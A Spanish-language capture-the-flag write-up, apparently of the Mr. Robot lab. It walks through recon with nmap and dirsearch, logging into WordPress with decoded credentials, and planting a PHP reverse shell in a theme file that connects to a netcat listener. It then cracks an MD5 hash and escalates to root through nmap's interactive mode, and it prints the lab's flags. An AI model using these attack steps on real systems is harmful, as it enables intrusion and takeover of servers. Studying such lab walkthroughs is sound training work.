# Reconocimiento 
--- 
A primera vista esta maquina no nos da mucha información **visible** en la web, ya os aviso que no tenemos que hacer nada en la web ,sino que vamos a juanquear internamente

![Image](https://github.com/shell-bomb/CTFs/blob/main/Imagenes/1foto.png)

## NMAP
Si realizamos un nmap basico a esta maquina observamos que nos da **3** puertos, Puerto FTP, puerto HTTP y HTTPS
 ~~~~bash
nmap -sV 10.10.92.13  
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-15 14:54 GMT
Stats: 0:00:22 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 50.00% done; ETC: 14:55 (0:00:00 remaining)
Nmap scan report for 10.10.92.13
Host is up (0.068s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
443/tcp open   ssl/http Apache httpd

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.05 seconds
~~~~

No nos arroja mucha información importante, vamos a realizar un scanner de directorios usando 
dirsearch.py y obtenemos esto:

## Dirsearch 
~~~~bash
python3 dirsearch.py -u https://10.10.92.13  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

  _|. _ _  _  _  _ _|_    v0.4.3                                             
 (_||| _) (/_(_|| (_| )                                                      
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25
Wordlist size: 220545

Output File: /home/bardock/repos/dirsearch/reports/https_10.10.92.13/_22-11-15_15-00-19.txt

Target: https://10.10.92.13/

[15:00:19] Starting:                                                         
[15:00:21] 301 -  235B  - /images  ->  https://10.10.92.13/images/
[15:00:21] 200 -    0B  - /sitemap                                          
[15:00:22] 301 -  233B  - /blog  ->  https://10.10.92.13/blog/              
[15:00:22] 301 -    0B  - /rss  ->  https://10.10.92.13/feed/               
[15:00:22] 302 -    0B  - /login  ->  https://10.10.92.13/wp-login.php      
[15:00:23] 301 -  234B  - /video  ->  https://10.10.92.13/video/            
[15:00:23] 301 -    0B  - /feed  ->  https://10.10.92.13/feed/              
[15:00:23] 301 -    0B  - /0  ->  https://10.10.92.13/0/
[15:00:24] 301 -    0B  - /image  ->  https://10.10.92.13/image/            
[15:00:24] 301 -    0B  - /atom  ->  https://10.10.92.13/feed/atom/         
[15:00:25] 301 -  239B  - /wp-content  ->  https://10.10.92.13/wp-content/  
[15:00:26] 301 -  234B  - /admin  ->  https://10.10.92.13/admin/            
[15:00:27] 301 -  234B  - /audio  ->  https://10.10.92.13/audio/            
[15:00:28] 200 -  504KB - /intro                                            
[15:00:30] 200 -    1KB - /wp-login                                         
[15:00:31] 301 -  232B  - /css  ->  https://10.10.92.13/css/                
[15:00:31] 301 -    0B  - /rss2  ->  https://10.10.92.13/feed/              
[15:00:34] 200 -  158B  - /license                                          
CTRL+C detected: Pausing threads, please wait...
[q]uit / [c]ontinue: q
[q]uit / [c]ontinue: q
[s]ave / [q]uit without saving: q
 
Canceled by the user
~~~~

De directorios interesantes encontramos:
- `/license`
- `/wp-content`
- `/wp-login`
- `/robots.txt`

# 1º Flag
----
Examinamos el fichero `/robots.txt` y encontramos una ruta a la 1º flag
![Pasted image 20221115164902.png](https://github.com/shell-bomb/CTFs/blob/main/Imagenes/Pasted%20image%2020221115164902.png)

---
![Pasted image 20221115165022.png](https://github.com/shell-bomb/CTFs/blob/main/Imagenes/Pasted%20image%2020221115165022.png)

1º Flag = 073403c8a58a1f80d943455fb30724b9

## Explotacion 1.0

Examinamos el directorio /license y encontramos algo interesante
![Pasted image 20221115160421.png](https://github.com/shell-bomb/CTFs/blob/main/Imagenes/Pasted%20image%2020221115160421.png)
# Explotación 2.0
---
Encontramos un codigo "cifrado" en base 64 que cuando desciframos obtenemos que las credenciales del usuario son:

![Pasted image 20221115160802.png](https://github.com/shell-bomb/CTFs/blob/main/Imagenes/Pasted%20image%2020221115160802.png)

1. elliot
2. ER28-0652
Asi que regresamos al panel de login de wordpress e introducimos las claves que nos han dado y....

ENTRAMOS!!!

![Pasted image 20221115161354.png](https://github.com/shell-bomb/CTFs/blob/main/Imagenes/Pasted%20image%2020221115161354.png)

## Explotación wordpress via PHP-revershe shell

Resulta que en la versión de wordpress (4.1.2) es vulnerable a una subida de reverse shell en un tema de PHP.
Usando la plantilla de reverse shell de [Pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) Tenemos que suplantar la plantilla y poner esa shell cambiando la variable **IP** y la variable **PORT**  que apuntan a nuestra reverse shell
~~~~bash
nc -lvnp 4444       
listening on [any] 4444 ...
~~~~
En mi caso mi puerto es 4444 y mi IP es XX.XX.XX.XX (poned la IP de tun0 VPN)



![Pasted image 20221115170810.png](https://github.com/shell-bomb/CTFs/blob/main/Imagenes/Pasted%20image%2020221115170810.png)
Actualizamos el archivo y seguidamente para activar la reverse shell tenemos que apuntar directamente a la palntilla, apuntando a la URL http://10.10.92.13/wp-content/themes/twentyfifteen/404.php para que el php ejecute el codigo de dentro.

~~~bash
nc -lvnp 4444       
listening on [any] 4444 ...
connect to [XX.XX.XX.XX] from (UNKNOWN) [XX.XX.XX.XX] 54519
Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
 16:19:58 up  1:29,  0 users,  load average: 0.00, 0.01, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1(daemon) gid=1(daemon) groups=1(daemon)
/bin/sh: 0: can't access tty; job control turned off
$ 
~~~
BAM! Tenemos shell

![Pasted image 20221115172126.png](https://github.com/shell-bomb/CTFs/blob/main/Imagenes/Pasted%20image%2020221115172126.png)

# Explotación, Flag2 y 3
---

Siempre me gusta usar python, asi que vamos a usar una shell interactiva con python `python -c 'import pty; pty.spawn("/bin/bash")'`  y tenemos shell!!! pero aun no tenemos usuario ROOT con lo que eFazo.
No tenemos permisos para ejecutar ni hacer nada, pero en la carpeta del usuario hay un MD5 con la contraseña del usuario 
~~~~bash
daemon@linux:/home/robot$ cat password.raw-md5
cat password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b
~~~~

Introducimos el hash MD5 en internet y nos aparece

![Pasted image 20221115173155.png](https://github.com/shell-bomb/CTFs/blob/main/Imagenes/Pasted%20image%2020221115173155.png)

En resumen: 
- User: robot
- Pass: abcdefghijklmnopqrstuvwxyz
Realizamos un SU robot para tener permisos SUDO, ahora si que podemos hacer un cat de la flag

![Pasted image 20221115173835.png](https://github.com/shell-bomb/CTFs/blob/main/Imagenes/Pasted%20image%2020221115173835.png)

# Privesc y Flag3

Para escalar privilegios primero miramos que comandos y tools podemos ejecutar, mediante este comando

~~~~bash
robot@linux:~$ find / -perm -u=s -type f 2>/dev/null    
find / -perm -u=s -type f 2>/dev/null
/bin/ping
/bin/umount
/bin/mount
/bin/ping6
/bin/su
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/local/bin/nmap
~~~~
Y podemos ejecutar el comando nmap!!!


Para escalar privilegios tenemos que tirar de NMAP, ya que la versión 3.81

~~~~bash
robot@linux:~$ nmap -v
nmap -v

Starting nmap 3.81 ( http://www.insecure.org/nmap/ ) at 2022-11-15 16:39 UTC
No target machines/networks specified!
QUITTING!
~~~~

Hay una vulnerabilidad en la version de Nmap qeu nos permite generar una sesion de sh asi que 
ejecutando el comando `nmap --interactive` seguido de `!sh` para generarnos el entorno
Cambiamos al directorio `/root`

![Pasted image 20221115175025.png](https://github.com/shell-bomb/CTFs/blob/main/Imagenes/Pasted%20image%2020221115175025.png)

Y ya tenemos la FLAG!!!
Espero que os haya gustado este primer post, teneis por aqui mis redes sociales.
[Linkedin](https://www.linkedin.com/in/marco-carrasco-talan-6b5912198/)
[Github](https://github.com/shell-bomb)
[Youtube](https://www.youtube.com/channel/UCTgM3LdJZjpEpilLJB3piCA)
[Twitter](https://twitter.com/D0vahking)
[Discord](https://discord.gg/UXzFV3Dj8p)


